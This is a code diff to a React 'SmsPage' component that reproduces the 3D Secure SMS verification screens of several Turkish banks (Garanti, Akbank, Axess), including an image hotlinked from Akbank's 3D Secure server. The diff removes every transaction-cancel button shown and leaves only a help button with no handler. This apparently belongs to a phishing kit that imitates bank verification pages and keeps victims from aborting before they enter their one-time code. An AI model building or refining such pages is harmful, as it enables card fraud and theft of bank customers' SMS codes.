@@ -213,10 +213,7 @@ export default function SmsPage() {
                             <div className="box">
                                 <div className="shadow px-2 px-sm-4 pb-1 theme-garanti">
                                     <div className="px-2 pt-2">
-                                        <div className="text-right">
-                                            <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-right text-muted" style={{ background: 'none', border: 'none', outline: 'none' }}>
-                                                İptal
-                                            </button>
+                                        <div className="text-right" style={{ height: '24px' }}>
                                         </div>
                                         <div className="row m-0 title">
                                             <div className="col-6 text-left px-0 pt-1">
@@ -368,10 +365,7 @@ export default function SmsPage() {
                             <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" autoComplete="off" onSubmit={handleSubmit}>
                                 <div className="dijitalgozluk-ekran">
                                     <div className="dijitalgozluk-cerceve">
-                                        <div className="dijitalgozluk-kapat">
-                                            <button type="button" onClick={handleCancel} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
-                                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X" />
-                                            </button>
+                                        <div className="dijitalgozluk-kapat" style={{ height: '18px' }}>
                                         </div>
                                         <div className="dijitalgozluk-logolar">
                                             <div className="dijitalgozluk-logo dijitalgozluk-logo-banka">
@@ -689,9 +683,6 @@ export default function SmsPage() {
                                             </div>
                                             <div className="call-to-action">
                                                 <ul className="action-list" style={{ listStyle: 'none', padding: 0 }}>
-                                                    <li style={{ display: 'inline-block', marginRight: '10px' }}>
-                                                        <input type="button" onClick={handleCancel} value="İşlemi İptal Et" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
-                                                    </li>
                                                     <li style={{ display: 'inline-block' }}>
                                                         <input type="button" value="Yardım" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
                                                     </li>
@@ -816,11 +807,8 @@ export default function SmsPage() {
                                                 <input id="reSendButton" type="button" value="Tekrar Gönder" className="primary inProgress" disabled style={{ display: 'none' }} />
                                             </form>
                                             <div className="row mt-3">
-                                                <div className="col-6">
-                                                    <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-left" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>İşlemi İptal Et</button>
-                                                </div>
-                                                <div className="col-6 text-right">
-                                                    <button type="button" className="btn btn-link p-0 text-right" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>Yardım</button>
+                                                <div className="col-12 text-center">
+                                                    <button type="button" className="btn btn-link p-0" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>Yardım</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -966,10 +954,7 @@ export default function SmsPage() {
                                     <div className="call-to-action">
                                         <div className="action-list">
                                             <div className="action-row">
-                                                <div className="action-col left">
-                                                    <button type="button" onClick={handleCancel} className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>İşlemi İptal Et</button>
-                                                </div>
-                                                <div className="action-col right">
+                                                <div className="action-col" style={{ textAlign: 'center', width: '100%' }}>
                                                     <button type="button" className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>Yardım</button>
                                                 </div>
                                             </div>
